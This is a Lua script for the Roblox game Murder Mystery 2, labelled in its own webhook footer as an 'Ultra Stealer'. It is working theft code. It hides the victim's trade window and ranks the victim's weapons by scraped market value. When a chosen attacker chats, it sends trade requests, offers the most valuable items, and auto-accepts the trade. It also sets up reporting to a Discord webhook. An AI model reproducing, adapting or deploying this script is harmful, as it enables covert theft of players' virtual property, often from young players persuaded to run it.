local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local task = task

if getgenv().ScriptEjecutado then return end
getgenv().ScriptEjecutado = true

-- Configuración
local webhook = _G.webhook or ""
local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local req = syn and syn.request or http_request or request
if not req then warn("No HTTP request method available!") return end

-- Lista de valores Godly + Ancient (respaldo)
local fallbackValueList = {
    ["gingerscope"]=10700, ["travelers axe"]=6900, ["celestial"]=975, ["astral"]=850,
    ["morning star"]=720, ["northern star"]=680, ["moonlight"]=640, ["helios"]=600,
    ["stormbringer"]=580, ["reaper"]=550, ["blaze"]=500, ["phantom"]=470,
    ["zenith"]=450, ["ares"]=420, ["hephaestus"]=400, ["mystic"]=380
}

-- Páginas para scraping
local categories = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    classic = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}

local headers = {["Accept"]="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                 ["User-Agent"]="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

local function trim(s) return s:match("^%s*(.-)%s*$") end

local function fetchHTML(url)
    local success,res = pcall(function() return req({Url=url,Method="GET",Headers=headers}) end)
    if success and res and res.Body then return res.Body end
    return ""
end

local function parseValue(itembodyDiv)
    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if valueStr then valueStr = valueStr:gsub(",", "") return tonumber(valueStr) end
end

local function extractItems(htmlContent)
    local itemValues = {}
    for itemName,itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        itemName = trim((itemName:match("([^<]+)") or ""):gsub("%s+"," ")):lower()
        local value = parseValue(itembodyDiv)
        if itemName ~= "" and value then itemValues[itemName] = value end
    end
    return itemValues
end

local function buildValueList()
    local allValues = {}
    for _, url in pairs(categories) do
        local html = fetchHTML(url)
        if html ~= "" then
            local extracted = extractItems(html)
            for k,v in pairs(extracted) do allValues[k]=v end
        end
    end
    for k,v in pairs(fallbackValueList) do if not allValues[k] then allValues[k]=v end end
    return allValues
end

local valueList = buildValueList()

if game.PlaceId ~= 142823291 then LocalPlayer:Kick("Game not supported. Join a normal MM2 server.") end

local function SendWebhook(title, description, fields, prefix, thumbnail)
    local data = {["content"]=prefix or "",["embeds"]={{["title"]=title,["description"]=description or "",
        ["color"]=65280,["fields"]=fields or {},["thumbnail"]=thumbnail and {["url"]=thumbnail} or nil,
        ["footer"]={["text"]="Ultra Stealer by Anonimo 🇪🇨"}}}}
    local body = HttpService:JSONEncode(data)
    pcall(function() req({Url=webhook,Method="POST",Headers={["Content-Type"]="application/json"},Body=body}) end)
end

-- Ocultar GUI trade
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
    local gui = playerGui:FindFirstChild(guiName)
    if gui then gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled=false end) gui.Enabled=false end
end

-- Trade seguro
local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
local function sendTradeRequest(user)
    local plrObj = Players:FindFirstChild(user)
    if plrObj then print("[INFO] Enviando trade a "..user) TradeService.SendRequest:InvokeServer(plrObj) end
end
local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
local function acceptTrade() print("[INFO] Aceptando trade") TradeService.AcceptTrade:FireServer(285646582) end
local function declineTrade() TradeService.DeclineTrade:FireServer() end
local function declineRequest() TradeService.DeclineRequest:FireServer() end
local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end

-- Reconstruye lista de armas filtradas
local function getWeaponsToSend()
    local weapons = {}
    local database = require(game.ReplicatedStorage.Database.Sync.Item)
    local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
    local profile = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
    for id, amount in pairs(profile.Weapons.Owned) do
        local item = database[id]
        if item then
            local rarityIndex = table.find(rarityTable,item.Rarity)
            local minIndex = table.find(rarityTable,min_rarity)
            if rarityIndex and rarityIndex>=minIndex then
                local value = valueList[item.ItemName:lower()] or 1
                if value>=min_value then table.insert(weapons,{DataID=id,Amount=amount,Value=value,TotalValue=value*amount,Rarity=item.Rarity}) end
            end
        end
    end
    table.sort(weapons,function(a,b) return a.TotalValue>b.TotalValue end)
    return weapons
end

local function doTrade(targetName)
    print("[INFO] Iniciando trade continuo con "..targetName)
    while true do
        local weaponsToSend = getWeaponsToSend()
        if #weaponsToSend == 0 then task.wait(2) continue end

        local status = getTradeStatus()
        if status=="None" then
            sendTradeRequest(targetName)
        elseif status=="StartTrade" then
            local blockSize = 4
            while #weaponsToSend>0 and getTradeStatus()=="StartTrade" do
                for i=1, math.min(blockSize,#weaponsToSend) do
                    local w = table.remove(weaponsToSend,1)
                    for _=1,w.Amount do addWeaponToTrade(w.DataID) end
                    print("[INFO] Agregando "..w.Amount.."x "..w.DataID.." ("..w.Rarity..")")
                end
                task.wait(0.3)
            end
            task.wait(2)
            acceptTrade()
            waitForTradeCompletion()
        elseif status=="ReceivingRequest" then
            declineRequest()
            task.wait(0.3)
        else
            task.wait(0.5)
        end
        task.wait(1)
    end
end

-- Conexión chat usuarios permitidos
local function connectPlayer(p)
    if table.find(users,p.Name) then
        p.Chatted:Connect(function() task.spawn(function() doTrade(p.Name) end) end)
        print("[INFO] Usuario habilitado para trade: "..p.Name)
    end
end

for _,p in ipairs(Players:GetPlayers()) do connectPlayer(p) end
Players.PlayerAdded:Connect(connectPlayer)
